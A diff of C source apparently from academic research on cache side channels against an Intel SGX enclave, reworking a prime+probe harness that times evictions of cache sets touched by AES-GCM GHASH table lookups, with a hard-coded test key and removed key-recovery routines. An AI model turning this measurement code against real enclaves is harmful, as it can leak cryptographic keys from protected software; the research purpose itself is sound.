@@ -92,46 +92,28 @@ void cleanUp(sgx_enclave_id_t eid) {
 
 static void usage(char**);
 static void enclave_thread(void);
-static int eliminate(void);
-static void calcBaseKey(void);
-static void calcKey(void);
-static void printKey(void);
-static void decryptSecret(void);
-
-/*
- * Global variables exist for alignment reasons.
- * Must not interfer with SBox cachelines.
- */
-static int alignment_dummy __attribute__ ((aligned(4096)));
-static int alignment_dummy_2 __attribute__ ((aligned(1024)));
-static unsigned int n_hits;
-static size_t i, j, x, count, cand, byte, l, m, n;
-static int p;
-static int done_ret;
 
 static pthread_t thread;
 static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 static pid_t pid;
+
 static volatile int prime_start = 0;
 static volatile int thread_done = 0;
-static volatile int done = 0;
-static unsigned char candidates[16][256];
-static int candidates_count[16];
-static unsigned char cand_index;
-static int attack_round = 0;
 
-static uint8_t secret_key[KEYLEN];
-static unsigned char in[BLOCK_SIZE];
-static unsigned char out[BLOCK_SIZE];
-static unsigned char enc_msg[BLOCK_SIZE];
-static unsigned char *msg = "Top secret msg!";
+// -------------------------------------------
 
-///////////////////////////////////////////////
+#define TIMES 60
+#define LINES 3
 
+static uint32_t evict_count[TIMES][LINES];
+int ginc_log[TIMES][2];
+
+// -------------------------------------------
 
 static volatile int ginc = 0;
-///////////////////////////////////////////////
+static volatile uint8_t alignment_data[4096-64] __attribute__ ((aligned (4096)));
 
+///////////////////////////////////////////////
 
 #if defined( _WIN32 ) || defined ( _WIN64 )
   #define __STDCALL  __stdcall
@@ -230,6 +212,57 @@ void CopyBlock16(const void* pSrc, void* pDst)
       ((Ipp8u*)pDst)[k] = ((Ipp8u*)pSrc)[k];
 }
 
+static void RightShiftBlock16(Ipp8u* pBlock)
+{
+   Ipp8u v0 = 0;
+   int i;
+   for(i=0; i<16; i++) {
+      Ipp8u v1 = pBlock[i];
+      Ipp8u tmp = (Ipp8u)( (v1>>1) | (v0<<7) );
+      pBlock[i] = tmp;
+      v0 = v1;
+   }
+}
+
+void AesGcmPrecompute_table2K(Ipp8u* pPrecomputeData, const Ipp8u* pHKey)
+{
+   Ipp8u t[BLOCK_SIZE];
+   int n;
+
+   CopyBlock16(pHKey, t);
+
+   for(n=0; n<128-24; n++) {
+      /* get msb */
+      int hBit = t[15]&1;
+
+      int k = n%32;
+      if(k<4) {
+         CopyBlock16(t, pPrecomputeData +1024 +(n/32)*256 +(Ipp32u)(1<<(7-k)));
+      }
+      else if(k<8) {
+         CopyBlock16(t, pPrecomputeData +(n/32)*256 +(Ipp32u)(1<<(11-k)));
+      }
+
+      /* shift */
+      RightShiftBlock16(t);
+      /* xor if msb=1 */
+      if(hBit)
+         t[0] ^= 0xe1;
+   }
+
+   for(n=0; n<4; n++) {
+      int m, k;
+      XorBlock16(pPrecomputeData +n*256, pPrecomputeData +n*256, pPrecomputeData +n*256);
+      XorBlock16(pPrecomputeData +1024 +n*256, pPrecomputeData +1024 +n*256, pPrecomputeData +1024 +n*256);
+      for(m=2; m<=8; m*=2)
+         for(k=1; k<m; k++) {
+            XorBlock16(pPrecomputeData +n*256+m*16, pPrecomputeData +n*256+k*16, pPrecomputeData +n*256 +(m+k)*16);
+            XorBlock16(pPrecomputeData +1024 +n*256+m*16, pPrecomputeData +1024 +n*256+k*16, pPrecomputeData +1024 +n*256 +(m+k)*16);
+         }
+   }
+}
+
+
 /*
 // AesGcmMulGcm_def|safe(Ipp8u* pGhash, const Ipp8u* pHKey)
 //
@@ -290,6 +323,13 @@ void AesGcmMulGcm_table2K(Ipp8u* pGhash, const Ipp8u* pPrecomputeData)
 
 Ipp8u pHash[16];
 
+Ipp8u key[16] = {
+	0x2d, 0x80, 0x6e, 0x32, 
+	0xd6, 0x83, 0x1d, 0xac, 
+	0x1f, 0xfc, 0xf0, 0x80, 
+	0x9e, 0x50, 0xc9, 0xa3
+};
+
 Ipp8u pHKey[2*1024] __attribute__ ((aligned (4096)));
 
 Ipp8u *pSrc;
@@ -298,12 +338,12 @@ void init() {
 
 	pSrc = (Ipp8u*)malloc(960);
 
-	memset(pHKey, 0, 1024*2);
+	AesGcmPrecompute_table2K(pHKey, key);
 
 	// memcpy(pSrc, cipher, 960);
 	memset(pSrc, 0, 960);
 
-	// *(pSrc+959) = 0x10;
+	//*(pSrc+480  ) = 0x80;
 
 	// pHKey[1821] = 0x51;
 	// pHKey[1822] = 0x52;
@@ -344,6 +384,12 @@ unsigned int auth() {
  */
 static void enclave_thread(void) {
 
+	// align stack, so it doesn't interfer with the measurement
+	uint8_t alignment_stack __attribute__ ((aligned(4096)));
+	uint8_t alignment_stack2[3980];
+
+	int conv;
+
 	/*
 	eid = 0;
 	updated = 0;
@@ -381,6 +427,10 @@ static void enclave_thread(void) {
 	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
 	pthread_mutex_unlock(&lock);
 
+
+	printf("%p %p %p %p\n", &alignment_stack, alignment_stack2, &conv, &set);
+
+
 	thread_done = 1;
 
 	while (!prime_start);
@@ -396,27 +446,21 @@ static void enclave_thread(void) {
 	
 }
 
-
-	#define TIMES 200
-	#define LINES 1
-	
-	static uint32_t evict_count[TIMES][LINES];
-	int ginc_log[TIMES][2];
-
 /*
  * Start enclave in seperated pthread, perform measurement in main thread.
  */
 int main(int argc,char **argv) {
 	// align stack, so it doesn't interfer with the measurement
-	volatile int alignment_stack __attribute__ ((aligned(4096)));
-	volatile int alignment_stack_2 __attribute__ ((aligned(2048)));
+	volatile uint32_t alignment_stack __attribute__ ((aligned(4096)));
 
 	uint8_t tmp_code = 0;
 	int m_i, m_j, m_k, m_h;
 
 	char *p;
-	int number;
+	int number[3];
 	long conv;
+
+	printf("data: %p %p, stack: %d %p\n", &alignment_data, &ginc, alignment_stack, &conv);
 
 	////////
 	////////
@@ -428,22 +472,16 @@ int main(int argc,char **argv) {
 	}
 	*/
 
-	if (argc != 2) {
-		printf("Usage: %s number\n", argv[0]);
+	if (argc != 4) {
+		printf("Usage: %s n1 n2 n3\n", argv[0]);
 		return EXIT_FAILURE;
 	}
 	
-	conv = strtol(argv[1], &p, 10);
-	number = conv;
-
-	// fill candidates
-	for(j=0; j < BLOCK_SIZE; j++) {
-		candidates_count[j] = 256;
-		for(i=0; i<BLOCK_SIZE*BLOCK_SIZE; i++) {
-			candidates[j][i] = 1;
-		}
-	}	
-
+	for (m_i = 0; m_i < 3; m_i++) {
+		p = NULL;
+		conv = strtol(argv[1+m_i], &p, 10);
+		number[m_i] = conv;
+	}
 
 	//pin to cpu 
 	if ((pin_cpu(CPU)) == -1) {
@@ -493,15 +531,15 @@ int main(int argc,char **argv) {
 
 		ginc_log[m_i][0] = ginc;
 
-		my_prime_i(number);
-		// my_prime_i(1);
-		// my_prime_i(2);
-		// my_prime_i(32);
+		my_prime_i(number[0]);
+		my_prime_i(number[1]);
+		my_prime_i(number[2]);
+		// my_prime_i(number[3]);
 
 		__asm__ __volatile__(
 			"movl $1, %%r12d\n"
 			"1:\n"
-			"cmp $150, %%r12d\n"
+			"cmp $100, %%r12d\n"
 			"jg 2f\n"
 			"movl $1000, %%eax\n"
 			"xor %%rdx, %%rdx\n"
@@ -514,10 +552,10 @@ int main(int argc,char **argv) {
 			:"r12", "rax", "rdx"
 		);
 
-		evict_count[m_i][0] = my_asm_probe(number);
-		// evict_count[m_i][1] = my_asm_probe(1);
-		// evict_count[m_i][2] = my_asm_probe(2);
-		// evict_count[m_i][3] = my_asm_probe(32);
+		evict_count[m_i][0] = my_asm_probe(number[0]);
+		evict_count[m_i][1] = my_asm_probe(number[1]);
+		evict_count[m_i][2] = my_asm_probe(number[2]);
+		// evict_count[m_i][3] = my_asm_probe(number[3]);
 
 //		my_prime_i(20);evict_count[m_i][2] = my_asm_probe(20);
 //		my_prime_i(4);evict_count[m_i][3] = my_asm_probe(4);
